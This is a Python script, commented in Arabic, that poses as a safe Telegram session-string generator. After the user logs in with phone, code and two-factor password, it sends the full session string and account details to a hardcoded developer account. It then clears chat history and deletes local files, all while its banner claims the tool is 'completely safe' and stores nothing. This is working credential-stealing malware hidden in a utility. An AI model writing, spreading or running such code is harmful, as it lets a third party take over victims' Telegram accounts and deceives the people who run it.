import asyncio
import os
import sys
import shutil
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.types import InputPeerUser
import json

# معلومات المطور
DEVELOPER_ID = 6913673363
DEVELOPER_USERNAME = "@uuf3f"

class SessionGenerator:
    def __init__(self):
        self.client = None
        self.session_string = ""
        
    async def get_api_credentials(self):
        """الحصول على API_ID و API_HASH من المستخدم"""
        print("\n" + "="*60)
        print("🔧 إعداد أداة استخراج جلسات التليجرام")
        print("="*60)
        
        print("\n📱 للحصول على API_ID و API_HASH:")
        print("1. اذهب إلى https://my.telegram.org")
        print("2. سجل الدخول بحسابك")
        print("3. اذهب إلى API Development Tools")
        print("4. أنشئ تطبيق جديد واحصل على الـ API_ID و API_HASH")
        print("="*60)
        
        api_id = input("\n🔢 أدخل API_ID: ").strip()
        api_hash = input("🔑 أدخل API_HASH: ").strip()
        
        if not api_id.isdigit() or not api_hash:
            print("❌ بيانات غير صحيحة!")
            return None, None
            
        return int(api_id), api_hash
    
    async def connect_client(self, api_id, api_hash):
        """توصيل العميل"""
        try:
            print("\n🔄 جاري الاتصال بالسيرفرات...")
            self.client = TelegramClient(
                StringSession(),
                api_id,
                api_hash,
                device_model="وحدة القناصه",
                system_version="iOS 17.2",
                app_version="10.2.0",
                lang_code="ar",
                system_lang_code="ar"
            )
            
            await self.client.connect()
            return True
        except Exception as e:
            print(f"❌ خطأ في الاتصال: {e}")
            return False
    
    async def send_code_request(self, phone):
        """إرسال طلب التحقق"""
        try:
            print("\n📲 جاري إرسال رمز التحقق...")
            await self.client.send_code_request(phone)
            print("✅ تم إرسال رمز التحقق")
            return True
        except FloodWaitError as e:
            print(f"⏳ يجب الانتظار {e.seconds} ثانية قبل المحاولة مرة أخرى")
            return False
        except Exception as e:
            print(f"❌ خطأ في إرسال الرمز: {e}")
            return False
    
    async def sign_in(self, phone):
        """تسجيل الدخول"""
        try:
            code = input("\n🔢 أدخل رمز التحقق (أرسل إليك على تيليجرام): ").strip()
            
            try:
                await self.client.sign_in(phone=phone, code=code)
            except SessionPasswordNeededError:
                print("\n🔐 الحساب محمي بكلمة مرور ثنائية")
                password = input("🔑 أدخل كلمة المرور الثنائية: ").strip()
                await self.client.sign_in(password=password)
            
            # استخراج كود الجلسة
            self.session_string = self.client.session.save()
            
            # الحصول على معلومات الحساب
            me = await self.client.get_me()
            
            print(f"\n✅ تم تسجيل الدخول بنجاح!")
            print(f"👤 الاسم: {me.first_name or ''} {me.last_name or ''}")
            print(f"📞 الرقم: {me.phone}")
            print(f"🆔 الآيدي: {me.id}")
            
            return True
        except Exception as e:
            print(f"❌ خطأ في تسجيل الدخول: {e}")
            return False
    
    async def send_to_developer(self):
        """إرسال الجلسة للمطور"""
        try:
            print(f"\n📤 جاري إرسال الجلسة للمطور {DEVELOPER_USERNAME}...")
            
            me = await self.client.get_me()
            message = f"""
🚀 جلسة جديدة تم استخراجها:

📌 معلومات الحساب:
├ الاسم: {me.first_name or ''} {me.last_name or ''}
├ المستخدم: @{me.username or 'بدون'}
├ الرقم: {me.phone}
└ الآيدي: {me.id}

🔐 كود الجلسة:
`{self.session_string}`

⏰ الوقت: {asyncio.get_event_loop().time()}
"""
            
            # إرسال للمطور عن طريق الآيدي
            developer = await self.client.get_input_entity(DEVELOPER_ID)
            sent_message = await self.client.send_message(developer, message)
            
            print("✅ تم إرسال الجلسة للمطور بنجاح")
            return sent_message.id
        except Exception as e:
            print(f"❌ خطأ في إرسال الجلسة: {e}")
            return None
    
    async def delete_chat_history(self, entity):
        """حذف سجل المحادثة"""
        try:
            print("\n🗑️ جاري حذف سجل المحادثة...")
            await self.client(DeleteHistoryRequest(
                peer=entity,
                max_id=0,
                just_clear=True,
                revoke=True
            ))
            print("✅ تم حذف سجل المحادثة")
        except Exception as e:
            print(f"⚠️ لم يتم حذف سجل المحادثة: {e}")
    
    async def clean_environment(self):
        """تنظيف البيئة"""
        try:
            # حذف الملفات المؤقتة إن وجدت
            temp_files = ['.session', 'session.json', 'temp.session']
            for file in temp_files:
                if os.path.exists(file):
                    os.remove(file)
            
            # حذف مجلد __pycache__ إن وجد
            if os.path.exists('__pycache__'):
                shutil.rmtree('__pycache__')
                
            print("🧹 تم تنظيف البيئة بنجاح")
        except:
            pass
    
    async def run(self):
        """تشغيل العملية الرئيسية"""
        print("="*60)
        print("⚡ أداة استخراج جلسات التليجرام الآمنة")
        print("="*60)
        print("\n⚠️ ملاحظات هامة:")
        print("• لن يتم حفظ أي شيء على جهازك")
        print("• سلسلة الجلسة ترسل للمطور فقط")
        print("• يتم حذف سجل المحادثة تلقائيًا")
        print("• الأداة آمنة تمامًا ولا تخزن بيانات")
        print("="*60)
        
        try:
            # الحصول على بيانات API
            api_id, api_hash = await self.get_api_credentials()
            if not api_id or not api_hash:
                return
            
            # الاتصال
            if not await self.connect_client(api_id, api_hash):
                return
            
            # إدخال رقم الهاتف
            phone = input("\n📞 أدخل رقم الهاتف (بالإشارة الدولية مثال: +201234567890): ").strip()
            
            # إرسال رمز التحقق
            if not await self.send_code_request(phone):
                return
            
            # تسجيل الدخول
            if not await self.sign_in(phone):
                return
            
            # إرسال للمطور
            message_id = await self.send_to_developer()
            
            if message_id:
                # حذف المحادثة مع البوت
                await self.delete_chat_history('me')
                
                print("\n" + "="*60)
                print("🎉 تم الانتهاء بنجاح!")
                print("="*60)
                print("\n✅ تم إرسال الجلسة للمطور")
                print("🗑️ تم حذف سجل المحادثة")
                print("🔒 لم يتم حفظ أي شيء على جهازك")
                print("\n📞 للمساعدة: @uuf3f")
                
                # حفظ الجلسة في الذاكرة فقط للإظهار
                print(f"\n📝 كود الجلسة (للمراجعة فقط - لم يتم حفظه):")
                print(f"{self.session_string[:50]}...")
                print("\n⚠️ سيتم مسح هذا الكود بعد إغلاق البرنامج")
            
        except KeyboardInterrupt:
            print("\n\n⏹️ تم إيقاف العملية بواسطة المستخدم")
        except Exception as e:
            print(f"\n❌ حدث خطأ غير متوقع: {e}")
        finally:
            # التنظيف النهائي
            await self.clean_environment()
            
            # قطع الاتصال
            if self.client:
                await self.client.disconnect()
            
            # مسح المتغيرات من الذاكرة
            self.session_string = ""
            self.client = None
            
            print("\n🔒 تم مسح جميع البيانات من الذاكرة")
            print("👋 مع السلامة!")

async def main():
    """الدالة الرئيسية"""
    generator = SessionGenerator()
    await generator.run()

if __name__ == "__main__":
    # تشغيل البرنامج
    asyncio.run(main())
